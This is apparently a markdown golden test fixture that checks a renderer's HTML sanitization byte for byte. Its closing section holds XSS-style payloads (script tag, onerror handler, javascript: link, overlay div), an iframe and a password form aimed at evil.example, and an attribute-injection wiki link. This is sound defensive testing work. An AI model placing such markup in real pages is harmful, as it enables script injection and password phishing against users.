# Golden fixture

This file is rendered on every build and compared BYTE FOR BYTE against
test-fixtures/golden-output.html. It exists because the headline parity test is
RELATIVE: it compares this package against the app's renderer, and both copies of
the sanitize schema are deliberately patched together to prevent drift. A change
made to both sides at once therefore passes parity perfectly, which is the exact
shape of the original defect, where sanitizing was removed to make a comparison
agree. Only an absolute fixture catches both implementations moving together.

If this file's rendering changes, a human has to look at the diff and say yes.

## Wiki links, all four shapes

A plain [[some-page]], an aliased [[some-page|Nice Name]], an anchored
[[some-page#section]], and a [[definitely-missing-page]] that should still carry
its data attributes.

Note that [[Some Page]] with capitals and a space is NOT a wiki link: the slug
validator is ^[a-z0-9-]+$, so it stays literal text. That is deliberate, and it
incidentally keeps injection attempts like [[a" onmouseover="x]] in text position
rather than attribute position.

## Aligned GFM table

| left | centre | right |
|:-----|:------:|------:|
| a    |   b    |     c |
| 1    |   2    |     3 |

Column alignment must survive as align attributes. It is emitted as align="..."
rather than style="text-align:...", which matters because inline style is stripped
by the schema; if a dependency changed that, alignment would silently vanish.

## Task list

- [x] a completed item
- [ ] an open item

## Fenced block with a language

```go
func main() { println("hi") } // a comment
```

## Inline code and emphasis
\Some `inline code`, some **bold**, some *italic*.

> A blockquote.

## Hostile payloads, locked so a schema loosening shows up here

<script>window.__X=1</script>

<img src=x onerror="window.__X=2">

<a href="javascript:window.__X=3">js link</a>

<div class="fixed inset-0 z-50 bg-black" style="position:fixed;inset:0">overlay</div>

<iframe src="https://evil.example/x"></iframe>

<form action="https://evil.example"><input name="pw" type="password"></form>

<p id="terminal-pane">id collision attempt</p>

<a href="https://example.com" target="_blank">benign external link</a>

## Provider embed, which must survive

<video src="https://youtu.be/dQw4w9WgXcQ"></video>
